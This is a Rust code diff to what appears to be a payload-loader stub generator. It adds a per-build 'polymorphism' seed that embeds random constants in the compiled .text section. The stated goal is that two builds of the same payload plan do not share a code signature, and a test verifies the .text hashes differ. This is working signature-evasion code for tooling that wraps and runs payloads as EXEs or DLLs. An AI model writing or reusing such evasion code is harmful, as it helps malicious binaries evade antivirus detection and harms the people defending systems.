@@ -131,6 +131,11 @@ pub struct StepsParams {
     pub kind: OutputKind,
     /// What starts the chain in a DLL build (`build.output.entry`).
     pub entry: DllEntry,
+    /// Per-build source-entropy seed (`build.polymorphism`), or `None` when the
+    /// source phase is off (`mode: none`/`codegen`). Baked into `.text` as an
+    /// immediate so two builds of one plan differ even under the same codegen
+    /// profile.
+    pub poly_seed: Option<u64>,
 }
 
 /// A rendered stub plus the non-fatal warnings a custom template produced.
@@ -251,10 +256,19 @@ fn render_common(
         .map(|step| render_step_module(step, strings))
         .collect::<Result<Vec<_>>>()?
         .concat();
-    let runner = render_runner_body(&params.steps, strings, params.debug)?;
+    let runner = render_runner_body(&params.steps, strings, params.debug, params.poly_seed)?;
 
     let mut values = BTreeMap::new();
-    values.insert("$STUB_HELPERS$".to_string(), STUB_HELPERS.to_string());
+    // The per-build source entropy is appended to the shared helpers: a function
+    // whose body holds per-build immediates, so `.text` differs even when the
+    // codegen profile matches (`docs/design/polymorphism.md`, phase 2).
+    values.insert(
+        "$STUB_HELPERS$".to_string(),
+        match params.poly_seed {
+            Some(seed) => format!("{STUB_HELPERS}{}", poly_helpers(seed)),
+            None => STUB_HELPERS.to_string(),
+        },
+    );
     // The entry point: `fn main()` for an executable, the exports for a DLL
     // (`build.output.kind`/`entry`). A custom stub that defines its own `fn main`
     // simply omits the placeholder.
@@ -317,6 +331,45 @@ fn render_common(
         source,
         warnings: Vec::new(),
     })
+}
+
+/// The per-build source-level entropy appended to `$STUB_HELPERS$`.
+///
+/// The body holds four per-build immediates; because they land inside
+/// instructions, two builds of the same plan differ in `.text` even when the
+/// codegen profile (phase 1) happens to match. The result is unused and
+/// `black_box`ed, and the function is `#[inline(never)]`, so the optimizer
+/// cannot fold or delete it. Deterministic in `seed`, so the manifest seed
+/// reproduces the artifact.
+fn poly_helpers(seed: u64) -> String {
+    let mut state = seed;
+    let a = splitmix64(&mut state);
+    let b = splitmix64(&mut state);
+    let c = splitmix64(&mut state);
+    let d = splitmix64(&mut state);
+    format!(
+        "\n/// Per-build entropy: bakes the build seed into `.text` so two builds of\n\
+         /// one plan do not share a code signature. Behaviour is unchanged.\n\
+         #[inline(never)]\n\
+         #[allow(dead_code)]\n\
+         fn poly_seed_mix() -> u64 {{\n\
+         \x20   let a: u64 = {a:#018x};\n\
+         \x20   let b: u64 = {b:#018x};\n\
+         \x20   let mut x = a ^ core::hint::black_box(b);\n\
+         \x20   x = x.wrapping_mul({c:#018x}) ^ {d:#018x};\n\
+         \x20   core::hint::black_box(x)\n\
+         }}\n"
+    )
+}
+
+/// splitmix64: a tiny, dependency-free deterministic mixer for the source-level
+/// per-build constants.
+fn splitmix64(state: &mut u64) -> u64 {
+    *state = state.wrapping_add(0x9E37_79B9_7F4A_7C15);
+    let mut z = *state;
+    z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
+    z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
+    z ^ (z >> 31)
 }
 
 /// The union of every step's technique, for the shared blocks.
@@ -383,8 +436,14 @@ fn render_runner_body(
     steps: &[StepPayload],
     strings: &StringsConfig,
     debug: bool,
+    poly_seed: Option<u64>,
 ) -> Result<String> {
     let mut body = String::new();
+    if poly_seed.is_some() {
+        // Runs once before any step: the call keeps the per-build entropy
+        // function in the binary (the optimizer would drop an uncalled one).
+        body.push_str("    let _ = crate::poly_seed_mix();\n");
+    }
     for step in steps {
         body.push_str(&format!(
             "\n    // --- step {}: {} ---\n",
@@ -607,6 +666,7 @@ pub(crate) fn test_params(
         windows_subsystem: false,
         kind: OutputKind::Exe,
         entry: DllEntry::Auto,
+        poly_seed: None,
     }
 }
 
@@ -706,6 +766,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            poly_seed: None,
         };
         render_builtin(
             &template(),
@@ -725,6 +786,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            poly_seed: None,
         };
         render_builtin(
             &template(),
@@ -846,6 +908,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Dll,
             entry: DllEntry::Export("Start".to_string()),
+            poly_seed: None,
         };
         let source = render_builtin(
             &template(),
@@ -882,6 +945,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            poly_seed: None,
         };
         let rendered = render_custom(
             "fn main() {}\n",
@@ -904,6 +968,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            poly_seed: None,
         };
         let result = render_builtin(
             "fn main() {}",
@@ -924,6 +989,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            poly_seed: None,
         };
         let rendered = render_custom(
             "fn main() {}",
@@ -993,6 +1059,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            poly_seed: None,
         };
         let source = render_builtin(
             &template(),
@@ -1034,6 +1101,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Dll,
             entry: DllEntry::Auto,
+            poly_seed: None,
         };
         let source = render_builtin(
             &template(),
@@ -1070,5 +1138,74 @@ mod tests {
         for export in ["DllMain", "JNI_OnLoad", "Run"] {
             assert!(text.contains(export), "missing export '{export}'");
         }
+    }
+
+    /// The polymorphism goal: two builds of the same plan must not share a
+    /// `.text`. Compiles the same source with two source-level seeds (phase 2)
+    /// and compares the code section. Marked `#[ignore]` for the same reasons as
+    /// the other compile tests; the measured numbers live in
+    /// `docs/design/polymorphism.md`.
+    #[test]
+    #[ignore = "requires rustc and the compiled dependencies"]
+    fn two_polymorphism_seeds_differ_in_the_text_section() {
+        use crate::engine::compiler;
+        use crate::engine::pe;
+        use sha2::{Digest, Sha256};
+
+        fn text_hash(path: &std::path::Path) -> String {
+            let bytes = std::fs::read(path).expect("read");
+            let info = pe::parse(&bytes).expect("a valid PE");
+            let text = info
+                .sections
+                .iter()
+                .find(|section| &section.name[..5] == b".text")
+                .expect(".text section");
+            let start = text.pointer_to_raw_data as usize;
+            let end = start + text.size_of_raw_data as usize;
+            hex::encode(Sha256::digest(&bytes[start..end]))
+        }
+
+        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join("build")
+            .join("poly_test");
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(dir.join("payload_0.bin"), [0u8; 16]).unwrap();
+
+        let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
+        let mut hashes = Vec::new();
+        for (index, seed) in [0x1111_2222_3333_4444u64, 0xAAAA_BBBB_CCCC_DDDDu64]
+            .into_iter()
+            .enumerate()
+        {
+            let params = StepsParams {
+                steps: vec![execution_step(0)],
+                build_args: BTreeMap::new(),
+                debug: false,
+                windows_subsystem: false,
+                kind: OutputKind::Exe,
+                entry: DllEntry::Auto,
+                poly_seed: Some(seed),
+            };
+            let source = render_builtin(
+                &template(),
+                &params,
+                &strings(),
+                &SyscallsConfig::default(),
+                &ApiResolutionConfig::default(),
+            )
+            .expect("render");
+            let main_path = dir.join(format!("main_{index}.rs"));
+            std::fs::write(&main_path, &source).unwrap();
+            let out = dir.join(format!("out_{index}.exe"));
+            compiler::compile_stub(&main_path, &out, &deps, compiler::CompileOptions::default())
+                .expect("compile");
+            hashes.push(text_hash(&out));
+        }
+
+        assert_ne!(
+            hashes[0], hashes[1],
+            "two polymorphism seeds produced the same .text"
+        );
     }
 }
